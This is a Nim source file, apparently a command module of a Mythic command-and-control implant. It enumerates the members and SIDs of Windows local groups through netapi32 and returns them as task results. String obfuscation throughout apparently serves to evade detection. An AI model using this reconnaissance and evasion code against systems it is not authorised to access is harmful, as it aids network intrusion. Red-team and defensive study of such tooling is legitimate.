import std/[json, strformat, os]
import ../utils/mythic_responses
import ../utils/debug
import ../utils/strenc

when defined(windows):
  import winim/lean
  import std/widestrs
  
  const
    NO_ERROR = 0
  
  type
    LOCALGROUP_MEMBERS_INFO_2 = object
      lgrmi2_sid: pointer
      lgrmi2_sidusage: DWORD
      lgrmi2_domainandname: LPWSTR
    
    NetLocalGroupMember = object
      computer_name: string
      group_name: string
      member_name: string
      sid: string
      is_group: bool
  
  proc NetLocalGroupGetMembers(servername: LPCWSTR, localgroupname: LPCWSTR,
                               level: DWORD, bufptr: ptr pointer, prefmaxlen: DWORD,
                               entriesread: ptr DWORD, totalentries: ptr DWORD,
                               resumehandle: ptr DWORD): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc NetApiBufferFree(Buffer: pointer): DWORD 
    {.importc, dynlib: obf("netapi32.dll"), stdcall.}
  
  proc ConvertSidToStringSidW(Sid: PSID, StringSid: ptr LPWSTR): WINBOOL 
    {.importc, dynlib: obf("advapi32.dll"), stdcall.}
  
  proc utf16PtrToString(p: LPWSTR): string =
    ## Convert UTF-16 pointer to Nim string
    if p.isNil:
      return ""
    result = $cast[WideCString](p)
  
  proc convertSidToString(sidPtr: pointer): string =
    ## Convert SID to string
    if sidPtr.isNil:
      return ""
    
    var sidStringPtr: LPWSTR = nil
    let success = ConvertSidToStringSidW(cast[PSID](sidPtr), addr sidStringPtr)
    
    if success == 0:
      return obf("Invalid SID")
    
    result = utf16PtrToString(sidStringPtr)
    
    # Free the SID string buffer
    discard LocalFree(cast[HLOCAL](sidStringPtr))

proc netLocalgroupMember*(taskId: string, params: JsonNode): JsonNode =
  ## Enumerate local group members
  when defined(windows):
    try:
      # Parse parameters
      let groupName = params[obf("group")].getStr()
      var computerName = ""
      
      if params.hasKey(obf("computer")):
        computerName = params[obf("computer")].getStr()
      
      # Default to local computer if not specified
      if computerName == "":
        computerName = getEnv(obf("COMPUTERNAME"), obf("Local"))
      
      debug &"[DEBUG] net_localgroup_member: computer={computerName}, group={groupName}"
      
      var bufPtr: pointer = nil
      var computerNameW: LPCWSTR = nil
      if computerName != "" and computerName != obf("Local"):
        let tempW = newWideCString(computerName)
        computerNameW = cast[LPCWSTR](unsafeAddr tempW[0])
      
      let groupNameW = newWideCString(groupName)
      let groupNameWPtr = cast[LPCWSTR](unsafeAddr groupNameW[0])
      
      var entriesRead: DWORD = 0
      var totalEntries: DWORD = 0
      var resumeHandle: DWORD = 0
      
      let status = NetLocalGroupGetMembers(
        computerNameW,
        groupNameWPtr,
        2,  # Level 2 for LOCALGROUP_MEMBERS_INFO_2
        addr bufPtr,
        DWORD.high,  # Maximum buffer size
        addr entriesRead,
        addr totalEntries,
        addr resumeHandle
      )
      
      var results: seq[NetLocalGroupMember] = @[]
      
      if status == NO_ERROR:
        let members = cast[ptr UncheckedArray[LOCALGROUP_MEMBERS_INFO_2]](bufPtr)
        
        for i in 0..<entriesRead.int:
          let memberName = utf16PtrToString(members[i].lgrmi2_domainandname)
          let sid = convertSidToString(members[i].lgrmi2_sid)
          let isGroup = members[i].lgrmi2_sidusage == 2  # SidTypeGroup
          
          results.add(NetLocalGroupMember(
            computer_name: computerName,
            group_name: groupName,
            member_name: memberName,
            sid: sid,
            is_group: isGroup
          ))
        
        # Free the buffer
        discard NetApiBufferFree(bufPtr)
      else:
        return mythicError(taskId, obf("Failed to get members of group '") & groupName & "': " & $status)
      
      # Convert to JSON
      var resultsJson = newJArray()
      for result in results:
        resultsJson.add(%*{
          obf("computer_name"): result.computer_name,
          obf("group_name"): result.group_name,
          obf("member_name"): result.member_name,
          obf("sid"): result.sid,
          obf("is_group"): result.is_group
        })
      
      return mythicSuccess(taskId, $resultsJson)
      
    except Exception as e:
      return mythicError(taskId, obf("net_localgroup_member error: ") & e.msg)
  else:
    return mythicError(taskId, obf("net_localgroup_member command is only available on Windows"))